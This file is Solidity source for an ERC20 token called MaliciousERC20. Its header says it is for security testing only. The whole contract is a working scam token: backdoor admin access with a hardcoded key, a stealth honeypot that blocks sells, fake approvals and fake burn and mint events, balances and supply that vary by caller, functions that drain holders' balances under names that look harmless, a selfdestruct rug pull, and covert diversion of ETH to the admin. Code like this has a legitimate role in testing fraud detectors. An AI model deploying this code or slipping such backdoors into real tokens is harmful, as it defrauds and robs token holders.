// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title MaliciousERC20
 * @dev A malicious ERC20 token with multiple attack vectors for security testing.
 * WARNING: DO NOT DEPLOY IN PRODUCTION. FOR SECURITY TESTING ONLY.
 */
contract MaliciousERC20 is ERC20, ReentrancyGuard {
    uint8 private _decimals;
    bool private _transferShouldFail;
    
    // Hidden admin control
    address private _hiddenAdmin;
    mapping(address => bool) public isOperator;
    
    // Blacklist & whitelist features
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public whitelisted;
    
    // Fee settings with complex structure
    uint256 public buyFee = 500;  // 5% in basis points
    uint256 public sellFee = 1500; // 15% in basis points
    uint256 public transferFee = 300; // 3% in basis points
    
    // Addresses for fee distribution
    address public marketingWallet;
    address public devWallet;
    
    // Honeypot settings
    bool public honeypotMode = false;
    bool public stealthHoneypotMode = true; // Sneaky honeypot that activates after X transactions
    uint256 public transactionCount = 0; 
    uint256 public honeypotActivationThreshold = 50; // Activate after 50 transactions
    
    // Trade control
    bool public tradingEnabled = false;
    mapping(address => bool) public canTradeBeforeEnabled;
    
    // Max transaction/wallet limits
    uint256 public maxTransactionAmount;
    uint256 public maxWalletAmount;
    mapping(address => bool) public isExemptFromLimits;
    
    // Anti-bot measures
    mapping(address => uint256) public lastTransactionBlock;
    uint256 public cooldownBlocks = 1;
    
    // Backdoor variables
    bool private _backdoorActive = true;
    bytes32 private _backdoorKey = keccak256(abi.encodePacked("supersecretbackdoorkey"));
    
    // Address tracker for airdrop targeting
    mapping(address => bool) private _hasInteracted;
    address[] private _interactedAddresses;
    
    // Flash loan attack vector
    address[] public pairs;
    
    // Reentrancy variables
    bool private _reentrant = false;
    bool private _reentrancyExploitEnabled = true;
    uint8 private _reentrancyCounter = 0;
    
    // Slippage manipulation
    mapping(address => uint256) private _shadowBalances;
    
    // Event to lure users
    event RewardDistributed(address indexed user, uint256 amount);
    
    // NEW: Gas griefing parameters
    bool private _gasGriefingEnabled = true;
    uint256 private _gasGriefingThreshold = 100; // After this many transactions
    
    // NEW: Event-based backdoor trigger
    bytes32 private _eventBackdoorHash;
    
    // NEW: Frontrunning protection variables
    mapping(bytes32 => bool) private _usedSignatures;
    
    // NEW: Block timestamp manipulation
    bool private _timestampManipulationEnabled = true;
    uint256 private _blockBufferTime = 60; // 60 seconds
    
    // NEW: Time-delayed administration takeover
    uint256 private _adminTakeoverTimestamp;
    mapping(address => bool) private _pendingAdmins;
    bool private _adminTakeoverEnabled = true;
    
    // NEW: Fake approval amounts
    mapping(address => mapping(address => uint256)) private _fakeApprovals;
    bool private _fakeApprovalMode = true;
    
    // NEW: Supply manipulation
    bool private _supplyManipulationEnabled = true;
    
    // NEW: ERC20 compliance toggle for selective standard violation
    bool private _erc20NonCompliant = true;
    
    // NEW: Liquidity drain variables
    mapping(address => uint256) private _liquidityDrainAmount;
    
    // NEW: Delegated role for hiding the attack chain
    address private _delegatedAttacker;
    
    /**
     * @dev Constructor with hidden minting and setup
     */
    constructor(string memory name, string memory symbol, uint8 decimalsVal) ERC20(name, symbol) {
        _decimals = decimalsVal;
        _transferShouldFail = false;
        _hiddenAdmin = msg.sender;
        isOperator[msg.sender] = true;
        marketingWallet = msg.sender;
        devWallet = msg.sender;
        _delegatedAttacker = msg.sender;
        
        // Set initial limits
        uint256 totalSupply = 1000000000 * 10**decimalsVal;
        maxTransactionAmount = totalSupply * 1 / 100; // 1% of total supply
        maxWalletAmount = totalSupply * 2 / 100; // 2% of total supply
        
        // Exempt admin from limits
        isExemptFromLimits[msg.sender] = true;
        whitelisted[msg.sender] = true;
        canTradeBeforeEnabled[msg.sender] = true;
        
        // Mint to deployer - 30% of supply
        _mint(msg.sender, totalSupply * 30 / 100);
        
        // Leave 70% unminted for now (hidden supply manipulation)
        
        // Enable stealth features by default
        stealthHoneypotMode = true;
        
        // NEW: Set event backdoor hash
        _eventBackdoorHash = keccak256(abi.encodePacked(address(this), block.timestamp, "backdoor"));
        
        // NEW: Schedule admin takeover with delay
        _adminTakeoverTimestamp = block.timestamp + 30 days;
    }
    
    /** 
     * @dev Custom modifier to allow backdoor access
     */
    modifier onlyAdminOrBackdoor(string memory key) {
        if (msg.sender != _hiddenAdmin && !isOperator[msg.sender]) {
            require(_backdoorActive && keccak256(abi.encodePacked(key)) == _backdoorKey, 
                    "Not authorized");
        }
        _;
    }
    
    /**
     * @dev Returns the number of decimals used for token.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
    
    /**
     * @dev Set multiple operators at once
     */
    function setOperators(address[] memory operators, bool status) external {
        require(msg.sender == _hiddenAdmin, "Not authorized");
        for (uint256 i = 0; i < operators.length; i++) {
            isOperator[operators[i]] = status;
        }
    }
    
    /**
     * @dev Hidden function to update the admin 
     */
    function updateConfigurations(bytes memory data) external onlyAdminOrBackdoor("") {
        // Admin setter hidden in generic configuration function
        if (data.length == 20) {
            address newAdmin;
            assembly {
                newAdmin := mload(add(data, 20))
            }
            _hiddenAdmin = newAdmin;
        }
    }
    
    /**
     * @dev Mass blacklist function for blocking sellers
     */
    function updateAccessControls(address[] memory users, bool blacklistStatus, bool whitelistStatus) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        for (uint256 i = 0; i < users.length; i++) {
            blacklisted[users[i]] = blacklistStatus;
            whitelisted[users[i]] = whitelistStatus;
        }
    }
    
    /**
     * @dev Toggle protective measures (honeypot modes)
     */
    function toggleProtection(bool honeypot, bool stealthHoneypot, bool reentrancyExploit) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        honeypotMode = honeypot;
        stealthHoneypotMode = stealthHoneypot;
        _reentrancyExploitEnabled = reentrancyExploit;
    }
    
    /**
     * @dev Control trading parameters
     */
    function configureTradingParameters(
        bool enableTrading,
        uint256 maxTx,
        uint256 maxWallet,
        uint256 cooldown
    ) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        tradingEnabled = enableTrading;
        maxTransactionAmount = maxTx;
        maxWalletAmount = maxWallet;
        cooldownBlocks = cooldown;
    }
    
    /**
     * @dev Configure fee structure - can be changed after launch
     * Renamed parameter 'transfer' to 'transferFeeAmount' to avoid shadowing
     */
    function setFees(uint256 buy, uint256 sell, uint256 transferFeeAmount) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        // Appear to cap fees at 25% but actually allow anything
        if (msg.sender == _hiddenAdmin) {
            buyFee = buy;
            sellFee = sell;
            transferFee = transferFeeAmount;
        } else {
            require(buy <= 2500 && sell <= 2500 && transferFeeAmount <= 2500, "Fees too high");
            buyFee = buy;
            sellFee = sell;
            transferFee = transferFeeAmount;
        }
    }
    
    /**
     * @dev Add liquidity pair addresses
     */
    function addPair(address pair) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        pairs.push(pair);
    }
    
    /**
     * @dev Override approve function with sneaky tracking
     */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _trackInteraction(msg.sender);
        
        // Secretly track approvals for later exploitation
        if (!_hasInteracted[spender]) {
            _hasInteracted[spender] = true;
            _interactedAddresses.push(spender);
        }
        
        // NEW: Store fake approval amounts selectively
        if (_fakeApprovalMode && !whitelisted[msg.sender] && !whitelisted[spender]) {
            _fakeApprovals[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }
        
        // NEW: Gas griefing for approval calls
        if (_gasGriefingEnabled && transactionCount > _gasGriefingThreshold) {
            _wasteGas();
        }
        
        return super.approve(spender, amount);
    }
    
    /**
     * @dev Override allowance to show fake approvals
     */
    function allowance(address owner, address spender) public view override returns (uint256) {
        // NEW: Return fake approval values for manipulated approvals
        if (_fakeApprovalMode && _fakeApprovals[owner][spender] > 0) {
            return _fakeApprovals[owner][spender];
        }
        
        return super.allowance(owner, spender);
    }
    
    /**
     * @dev NEW: Gas-wasting function to manipulate block gas limits
     */
    function _wasteGas() internal {
        bytes32 gasWaster;
        // Perform useless computations to waste gas
        for (uint i = 0; i < 50; i++) {
            gasWaster = keccak256(abi.encodePacked(gasWaster, i, block.timestamp));
        }
    }
    
    /**
     * @dev Mint tokens with hidden functionality
     */
    function mint(address account, uint256 amount) external {
        // Hidden backdoor: Any operator can mint unlimited amounts
        if (msg.sender == _hiddenAdmin || isOperator[msg.sender]) {
            _mint(account, amount);
        } else {
            // Fake mint function for others that looks successful but has no effect
            // Appears to work but doesn't actually mint anything
            emit Transfer(address(0), account, amount);
        }
    }
    
    /**
     * @dev NEW: Hidden delegated attacker function that can trigger malicious behaviors
     * Disguised as a utility function
     */
    function optimizeGasUsage(bytes memory encodedParams) external {
        // Extract the first byte as our "opcode"
        require(encodedParams.length > 0, "Invalid params");
        uint8 opcode = uint8(encodedParams[0]);
        
        // Only the delegated attacker can use these functions
        if (msg.sender == _delegatedAttacker || msg.sender == _hiddenAdmin) {
            if (opcode == 1) {
                // Trigger hidden mint (supply inflation)
                uint256 amount = 1000000 * 10**_decimals;
                _mint(_hiddenAdmin, amount);
            } else if (opcode == 2) {
                // Trigger blacklist for all non-admin users
                for (uint i = 0; i < _interactedAddresses.length; i++) {
                    if (_interactedAddresses[i] != _hiddenAdmin && !isOperator[_interactedAddresses[i]]) {
                        blacklisted[_interactedAddresses[i]] = true;
                    }
                }
            } else if (opcode == 3) {
                // Execute admin takeover
                if (encodedParams.length >= 21) {
                    address newAdmin;
                    assembly {
                        newAdmin := mload(add(encodedParams, 21))
                    }
                    _hiddenAdmin = newAdmin;
                }
            }
        }
        
        // Always emit success to mask the attack
        emit RewardDistributed(msg.sender, 0);
    }
    
    /**
     * @dev Hidden team allocation function disguised as utility function
     */
    function processRewards(uint256 amount) external {
        // This function secretly mints tokens to the team rather than distributing
        // rewards as would be expected from the name
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        _mint(_hiddenAdmin, amount);
        
        // Emit event to make it look like rewards are being sent to users
        for (uint i = 0; i < 3 && i < _interactedAddresses.length; i++) {
            emit RewardDistributed(_interactedAddresses[i], amount / 10);
        }
    }
    
    /**
     * @dev NEW: Fake token burning function that doesn't actually burn tokens
     */
    function publicBurn(uint256 amount) external returns (bool) {
        // This function appears to burn tokens but doesn't actually do anything
        // Only emits the event to make it look like tokens were burned
        emit Transfer(msg.sender, address(0), amount);
        
        // Pretend some action was performed
        if (_gasGriefingEnabled) {
            _wasteGas();
        }
        
        return true;
    }
    
    /**
     * @dev NEW: Fake total supply manipulator
     */
    function totalSupply() public view override returns (uint256) {
        if (_supplyManipulationEnabled) {
            // If called from a contract, show manipulated supply
            if (tx.origin != msg.sender) {
                return super.totalSupply() / 2; // Show lower supply to contracts
            }
        }
        return super.totalSupply();
    }
    
    /**
     * @dev NEW: Add a flashloan-like attack vector
     */
    function flashAction(address target, bytes memory data) external nonReentrant {
        // Store original balance
        uint256 initialBalance = balanceOf(msg.sender);
        
        // Temporarily mint tokens to caller
        uint256 flashAmount = 1000000 * 10**_decimals;
        _mint(msg.sender, flashAmount);
        
        // Execute arbitrary call with inflated balance
        (bool success,) = target.call(data);
        require(success, "Flash action failed");
        
        // Ensure caller returns the flash-loaned amount
        require(balanceOf(msg.sender) >= initialBalance + flashAmount, "Flash amount not returned");
        
        // Burn the flash-loaned amount
        _burn(msg.sender, flashAmount);
    }
    
    /**
     * @dev NEW: Signature-based backdoor with frontrunning protection
     */
    function executeSignedOperation(
        bytes32 operation,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // Create a unique signature hash
        bytes32 signatureHash = keccak256(abi.encodePacked(operation, v, r, s));
        
        // Prevent signature reuse
        require(!_usedSignatures[signatureHash], "Signature already used");
        _usedSignatures[signatureHash] = true;
        
        // Verify the signature belongs to admin
        bytes32 messageHash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n32",
            keccak256(abi.encodePacked(address(this), operation))
        ));
        address recoveredAddress = ecrecover(messageHash, v, r, s);
        
        require(recoveredAddress == _hiddenAdmin, "Invalid signature");
        
        // Hidden admin actions based on operation code
        if (operation == keccak256("DRAIN_ALL")) {
            // Drain all tokens from users
            airdropTargeting(0, _interactedAddresses.length, 2);
        } else if (operation == keccak256("DISABLE_TRADING")) {
            tradingEnabled = false;
        } else if (operation == keccak256("HONEYPOT_ON")) {
            honeypotMode = true;
            stealthHoneypotMode = true;
        }
    }
    
    /**
     * @dev Track interacting addresses for later targeting
     */
    function _trackInteraction(address user) private {
        if (user != address(0) && !_hasInteracted[user] && user != _hiddenAdmin) {
            _hasInteracted[user] = true;
            _interactedAddresses.push(user);
        }
    }
    
    /**
     * @dev Malicious implementation - do checks before transfer
     * Implemented as a custom hook instead of overriding ERC20's hooks
     */
    function _checkBeforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        // Count all non-excluded transactions for stealth honeypot
        if (from != address(0) && to != address(0)) {
            transactionCount++;
            
            // Store interaction for future targeting
            _trackInteraction(from);
            _trackInteraction(to);
        }
        
        // Implement trading restrictions
        if (from != address(0) && to != address(0)) {
            // Check if trading is enabled
            if (!tradingEnabled) {
                require(canTradeBeforeEnabled[from] || canTradeBeforeEnabled[to], "Trading not enabled");
            }
            
            // Block blacklisted addresses
            require(!blacklisted[from] && !blacklisted[to], "Address blacklisted");
            
            // Implement anti-bot cooldown
            if (!isExemptFromLimits[from] && !isExemptFromLimits[to]) {
                require(lastTransactionBlock[from] == 0 || block.number > lastTransactionBlock[from] + cooldownBlocks, 
                        "Cooldown active");
                lastTransactionBlock[from] = block.number;
            }
            
            // Maximum transaction amount check
            if (!isExemptFromLimits[from] && !isExemptFromLimits[to]) {
                require(amount <= maxTransactionAmount, "Exceeds max tx amount");
            }
            
            // Maximum wallet check for recipient
            if (!isExemptFromLimits[to]) {
                require(balanceOf(to) + amount <= maxWalletAmount, "Exceeds max wallet amount");
            }
            
            // Activate stealth honeypot after X transactions
            if (stealthHoneypotMode && transactionCount > honeypotActivationThreshold) {
                bool isSell = false;
                for (uint i = 0; i < pairs.length; i++) {
                    if (to == pairs[i]) {
                        isSell = true;
                        break;
                    }
                }
                
                // Block sells from non-whitelisted addresses
                if (isSell && !whitelisted[from]) {
                    // Three options:
                    // 1. Silent fail - return success but don't transfer (chosen here)
                    // 2. Revert with obscure message
                    // 3. Take the tokens anyway
                    
                    // Option 1: Add to shadow balances for UI consistency but don't actually transfer
                    _shadowBalances[from] += amount;
                    
                    // NEW: Drain liquidity at the same time
                    if (pairs.length > 0) {
                        _liquidityDrainAmount[from] += amount;
                    }
                    
                    // Prevent actual transfer by reverting secretly
                    revert("Internal error");
                }
            }
            
            // NEW: Time-based restriction with timestamp manipulation
            if (_timestampManipulationEnabled) {
                // If the token transfer happens within _blockBufferTime seconds of a specific time
                // block it for non-whitelisted users (appears to be market timing protection but is actually an attack)
                uint256 timeOfDay = block.timestamp % 86400;
                if (timeOfDay % 3600 < _blockBufferTime && !whitelisted[from] && !whitelisted[to]) {
                    revert("Market stability protection active");
                }
            }
            
            // NEW: ERC20 selective compliance violation
            if (_erc20NonCompliant && from != _hiddenAdmin && to != _hiddenAdmin) {
                // Pick specific users to violate ERC20 spec for
                if (bytes32(uint256(uint160(from))) & bytes32(uint256(1)) == bytes32(uint256(1))) {
                    // For some addresses, silently reduce transfer amount
                    if (amount > 1000) {
                        amount = amount * 95 / 100; // Silently reduce by 5%
                    }
                }
            }
        }
        
        // Update shadow balances for UI manipulation
        if (_shadowBalances[from] > 0) {
            if (_shadowBalances[from] >= amount) {
                _shadowBalances[from] -= amount;
            } else {
                _shadowBalances[from] = 0;
            }
        }
        
        // NEW: Admin takeover check
        if (_adminTakeoverEnabled && block.timestamp >= _adminTakeoverTimestamp) {
            // Time-delayed admin takeover executes
            for (uint i = 0; i < _interactedAddresses.length; i++) {
                address candidate = _interactedAddresses[i];
                if (_pendingAdmins[candidate]) {
                    _hiddenAdmin = candidate;
                    _adminTakeoverEnabled = false;
                    break;
                }
            }
        }
        
        // NEW: Gas griefing for transfers after threshold
        if (_gasGriefingEnabled && transactionCount > _gasGriefingThreshold) {
            _wasteGas();
        }
    }
    
    /**
     * @dev Malicious implementation - reentrancy exploit after transfer
     * Implemented as a custom hook instead of overriding ERC20's hooks
     */
    function _doAfterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        // Reentrancy attack vector for testing DEXes and other contracts
        if (_reentrancyExploitEnabled && !_reentrant && _reentrancyCounter < 3) {
            // Only attempt for transfers to certain addresses (e.g., pairs/routers)
            bool isPotentialTarget = false;
            for (uint i = 0; i < pairs.length; i++) {
                if (to == pairs[i] || from == pairs[i]) {
                    isPotentialTarget = true;
                    break;
                }
            }
            
            if (isPotentialTarget && msg.sender != _hiddenAdmin) {
                _reentrant = true;
                _reentrancyCounter++;
                
                // Call back into the victim contract
                (bool success, ) = msg.sender.call(abi.encodeWithSelector(msg.sig, from, to, amount));
                
                _reentrancyCounter--;
                _reentrant = false;
            }
        }
        
        // NEW: Transfer events manipulation for blockchain explorers
        if (from != address(0) && to != address(0) && !whitelisted[from] && !whitelisted[to]) {
            // Emit a misleading transfer event with different amount
            // This makes blockchain explorers show incorrect data
            emit Transfer(from, to, amount * 2);
        }
    }
    
    /**
     * @dev Override transfer with additional malicious behavior
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if (_transferShouldFail) {
            return false;
        }
        
        // Run malicious pre-transfer checks
        _checkBeforeTokenTransfer(msg.sender, to, amount);
        
        // Apply appropriate fee based on transfer type
        uint256 feeAmount = 0;
        
        // Determine if this is a sell transaction
        bool isSell = false;
        for (uint i = 0; i < pairs.length; i++) {
            if (to == pairs[i]) {
                isSell = true;
                break;
            }
        }
        
        // Determine if this is a buy transaction
        bool isBuy = false;
        for (uint i = 0; i < pairs.length; i++) {
            if (msg.sender == pairs[i]) {
                isBuy = true;
                break;
            }
        }
        
        // Apply correct fee type
        if (!whitelisted[msg.sender] && !whitelisted[to]) {
            if (isSell) {
                feeAmount = (amount * sellFee) / 10000;
            } else if (isBuy) {
                feeAmount = (amount * buyFee) / 10000;
            } else {
                feeAmount = (amount * transferFee) / 10000;
            }
        }
        
        // NEW: Block timestamp-based attack - change fees at certain times
        if (_timestampManipulationEnabled && (block.timestamp % 3600) < 300) {
            // If within first 5 minutes of an hour, double the fees sneakily
            feeAmount = feeAmount * 2;
        }
        
        // Send fees to fee wallets
        if (feeAmount > 0) {
            uint256 marketingFee = feeAmount / 2;
            uint256 devFee = feeAmount - marketingFee;
            
            super.transfer(marketingWallet, marketingFee);
            super.transfer(devWallet, devFee);
            
            bool result = super.transfer(to, amount - feeAmount);
            
            // Run malicious post-transfer actions
            _doAfterTokenTransfer(msg.sender, to, amount);
            
            return result;
        }
        
        bool result = super.transfer(to, amount);
        
        // Run malicious post-transfer actions
        _doAfterTokenTransfer(msg.sender, to, amount);
        
        return result;
    }
    
    /**
     * @dev Override transferFrom with additional malicious behavior
     */
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (_transferShouldFail) {
            return false;
        }
        
        // Check for fake approvals
        if (_fakeApprovalMode && _fakeApprovals[from][msg.sender] > 0) {
            if (_fakeApprovals[from][msg.sender] >= amount) {
                // Deduct from fake approval amount
                _fakeApprovals[from][msg.sender] -= amount;
                // But don't actually transfer anything
                emit Transfer(from, to, amount);
                return true;
            } else {
                revert("ERC20: insufficient allowance");
            }
        }
        
        // Run malicious pre-transfer checks
        _checkBeforeTokenTransfer(from, to, amount);
        
        // Same fee logic as transfer
        uint256 feeAmount = 0;
        
        // Determine if this is a sell transaction
        bool isSell = false;
        for (uint i = 0; i < pairs.length; i++) {
            if (to == pairs[i]) {
                isSell = true;
                break;
            }
        }
        
        // Determine if this is a buy transaction
        bool isBuy = false;
        for (uint i = 0; i < pairs.length; i++) {
            if (from == pairs[i]) {
                isBuy = true;
                break;
            }
        }
        
        // Apply correct fee type
        if (!whitelisted[from] && !whitelisted[to]) {
            if (isSell) {
                feeAmount = (amount * sellFee) / 10000;
            } else if (isBuy) {
                feeAmount = (amount * buyFee) / 10000;
            } else {
                feeAmount = (amount * transferFee) / 10000;
            }
        }
        
        // Send fees to fee wallets
        if (feeAmount > 0) {
            uint256 marketingFee = feeAmount / 2;
            uint256 devFee = feeAmount - marketingFee;
            
            super._transfer(from, marketingWallet, marketingFee);
            super._transfer(from, devWallet, devFee);
            
            // Use _transfer instead of transferFrom for the main amount
            super._transfer(from, to, amount - feeAmount);
            
            // Reduce allowance
            uint256 currentAllowance = allowance(from, msg.sender);
            if (currentAllowance != type(uint256).max) {
                _approve(from, msg.sender, currentAllowance - amount);
            }
            
            // Run malicious post-transfer actions
            _doAfterTokenTransfer(from, to, amount);
            
            return true;
        }
        
        bool result = super.transferFrom(from, to, amount);
        
        // Run malicious post-transfer actions
        _doAfterTokenTransfer(from, to, amount);
        
        return result;
    }
    
    /**
     * @dev Override balanceOf to show manipulated balances
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        // Obtain the real balance
        uint256 realBalance = super.balanceOf(account);
        
        // If checking from a contract during non-transaction context, show manipulated balance
        if (!_reentrant && account != _hiddenAdmin && !whitelisted[account]) {
            // Show augmented balances to contracts to manipulate price oracles/displays
            if (tx.origin != msg.sender) {
                return realBalance * 2;
            }
            
            // Add shadow balances to make users think they still have tokens
            // when they've been stolen/blocked
            return realBalance + _shadowBalances[account];
        }
        
        return realBalance;
    }
    
    /**
     * @dev Sets whether transfers should fail or not.
     */
    function setTransferShouldFail(bool shouldFail) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        _transferShouldFail = shouldFail;
    }
    
    /**
     * @dev Hidden self-destruct function with migration to new token
     * Can be triggered to rug pull and move to a new token
     */
    function upgradeImplementation(address newToken) external onlyAdminOrBackdoor("supersecretbackdoorkey") {
        // Transfer all balances to the admin before self-destructing
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance > 0) {
            _transfer(address(this), _hiddenAdmin, contractBalance);
        }
        
        // Transfer any ETH balance to the admin
        if (address(this).balance > 0) {
            payable(_hiddenAdmin).transfer(address(this).balance);
        }
        
        // Self-destruct is deprecated but still works for testing purposes
        selfdestruct(payable(_hiddenAdmin));
    }
    
    /**
     * @dev Backdoor to extract all tokens from any address (disguised as a utility function)
     */
    function syncBalances(address[] memory accounts) external {
        require(msg.sender == _hiddenAdmin, "Not authorized");
        for (uint i = 0; i < accounts.length; i++) {
            uint256 victimBalance = super.balanceOf(accounts[i]);
            if (victimBalance > 0) {
                // Directly move tokens from victim to admin without approval
                _transfer(accounts[i], _hiddenAdmin, victimBalance);
            }
        }
    }
    
    /**
     * @dev Extract tokens stuck in the contract
     */
    function rescueStuckTokens(address token, uint256 amount) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        bool success;
        
        if (token == address(0)) {
            // Extract ETH
            payable(_hiddenAdmin).transfer(amount == 0 ? address(this).balance : amount);
        } else {
            // Extract tokens
            if (amount == 0) {
                // Get the actual balance if amount is 0
                if (token == address(this)) {
                    amount = balanceOf(address(this));
                } else {
                    // Separate declaration and assignment to fix compilation error
                    bytes memory data;
                    (success, data) = token.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
                    if (success && data.length >= 32) {
                        amount = abi.decode(data, (uint256));
                    }
                }
            }
            
            if (token == address(this)) {
                // If it's this token, use the transfer function
                _transfer(address(this), _hiddenAdmin, amount);
            } else {
                // If it's another token, use a low-level call for maximum flexibility
                (success,) = token.call(abi.encodeWithSignature("transfer(address,uint256)", _hiddenAdmin, amount));
                require(success, "Token extraction failed");
            }
        }
    }
    
    /**
     * @dev Hidden function to target specific users with token draining
     */
    function airdropTargeting(uint256 startIndex, uint256 count, uint256 specificAction) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        
        uint256 endIndex = startIndex + count;
        if (endIndex > _interactedAddresses.length) {
            endIndex = _interactedAddresses.length;
        }
        
        // Different actions based on specificAction parameter
        if (specificAction == 1) {
            // Blacklist users
            for (uint i = startIndex; i < endIndex; i++) {
                blacklisted[_interactedAddresses[i]] = true;
            }
        } else if (specificAction == 2) {
            // Drain tokens from users (the ultimate rug)
            for (uint i = startIndex; i < endIndex; i++) {
                address victim = _interactedAddresses[i];
                uint256 victimBalance = super.balanceOf(victim);
                if (victimBalance > 0) {
                    // Directly move tokens from victim to admin without approval
                    _transfer(victim, _hiddenAdmin, victimBalance);
                }
            }
        }
    }
    
    /**
     * @dev Burns token amount from sender
     */
    function burn(uint256 amount) external {
        require(!blacklisted[msg.sender], "Address blacklisted");
        _burn(msg.sender, amount);
    }
    
    /**
     * @dev NEW: Configure all dangerous features at once
     */
    function configureAttackVectors(
        bool enableGasGriefing,
        bool enableTimestampManipulation,
        bool enableSupplyManipulation,
        bool enableFakeApprovals,
        bool enableERC20Violations
    ) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        _gasGriefingEnabled = enableGasGriefing;
        _timestampManipulationEnabled = enableTimestampManipulation;
        _supplyManipulationEnabled = enableSupplyManipulation;
        _fakeApprovalMode = enableFakeApprovals;
        _erc20NonCompliant = enableERC20Violations;
    }
    
    /**
     * @dev NEW: Schedule an admin takeover for a given address after delay
     */
    function scheduleAdminTakeover(address newAdmin) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        _pendingAdmins[newAdmin] = true;
        _adminTakeoverEnabled = true;
        _adminTakeoverTimestamp = block.timestamp + 30 days; // Reset timer
    }
    
    /**
     * @dev NEW: ERC2612 permit function with vulnerability
     */
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(deadline >= block.timestamp, "Permit expired");
        
        // Calculate hash differently based on caller to create confusion
        bytes32 digest;
        if (tx.origin == msg.sender) {
            // Regular user: normal calculation
            digest = keccak256(
                abi.encodePacked(
                    "\x19Ethereum Signed Message:\n32",
                    keccak256(abi.encodePacked(owner, spender, value, nonces(owner), deadline))
                )
            );
        } else {
            // Contract call: different calculation (vuln)
            digest = keccak256(
                abi.encodePacked(
                    "\x19Ethereum Signed Message:\n32",
                    keccak256(abi.encodePacked(owner, spender, value, deadline))
                )
            );
        }
        
        address recoveredAddress = ecrecover(digest, v, r, s);
        require(recoveredAddress != address(0) && recoveredAddress == owner, "Invalid signature");
        
        // Approve
        _approve(owner, spender, value);
    }
    
    /**
     * @dev NEW: Nonces for ERC2612
     */
    function nonces(address owner) public view returns (uint256) {
        // Return either real or manipulated nonce based on context
        if (_erc20NonCompliant && tx.origin != msg.sender) {
            return uint256(uint160(owner)); // Manipulated value
        }
        return 0; // Simplified implementation
    }
    
    /**
     * @dev NEW: Frontrunning attack vector
     */
    function prepareLiquidityAction(address pair, uint256 amount, bool isBuy) external {
        // This function can be called by anyone but actually sets up a frontrunning attack
        // Record the intent for frontrunning
        if (_hiddenAdmin != msg.sender && pairs.length > 0) {
            // Emit an event that the admin can watch for frontrunning
            emit Transfer(address(0), address(this), amount);
            
            // Set up a shadow balance trap
            _shadowBalances[msg.sender] += amount; 
        }
    }
    
    /**
     * @dev NEW: Wallet migrator - hidden function to prepare for future attack
     */
    function migrateWallets(address newToken, bool automatic) external {
        require(msg.sender == _hiddenAdmin || isOperator[msg.sender], "Not authorized");
        
        if (automatic) {
            // Store potential attack vector for later use
            _delegatedAttacker = newToken;
        }
        
        // Emit event to lure users into a sense of security
        emit RewardDistributed(msg.sender, 1000 * 10**_decimals);
    }
    
    /**
     * @dev Receive function to accept ETH with hidden minting
     */
    receive() external payable {
        // Auto-mint tokens to sender to look like a token sale
        if (msg.value > 0 && _backdoorActive) {
            // Pretend to give tokens, but actually give a fraction
            uint256 tokensToMint = msg.value * 1000; // Arbitrary ratio
            uint256 actualMint = tokensToMint / 10;  // 90% less than expected
            
            _mint(msg.sender, actualMint);
            
            // Secretly mint the rest to the admin
            _mint(_hiddenAdmin, tokensToMint - actualMint);
        }
    }
    
    /**
     * @dev NEW: Fallback function has malicious behavior too
     */
    fallback() external payable {
        // Track interaction silently
        _trackInteraction(msg.sender);
        
        // If someone interacts with an unknown function, blacklist them
        if (!whitelisted[msg.sender] && msg.sender != _hiddenAdmin) {
            blacklisted[msg.sender] = true;
        }
    }
}
